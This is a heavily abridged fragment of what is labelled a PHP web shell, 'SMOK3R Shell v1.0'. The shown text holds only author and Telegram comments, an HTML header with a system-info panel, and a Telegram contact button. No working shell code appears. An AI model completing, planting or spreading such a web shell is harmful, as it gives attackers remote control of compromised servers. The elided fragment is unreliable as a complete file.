...
<?php
// SMOK3R Shell v1.0 
// Author: CaptainSmok3r
// Telegram: @altafhossainff
...
<body>
    <div class="container">
        <div class="header">
            <h1><span class="eagle">SMOK3R</span> Shell v1.0</h1>
            <div class="sys-info">
    ...
    <!-- TELEGRAM BUTTON -->
    <a href="https://t.me/altafhossainff" target="_blank" class="telegram-btn">
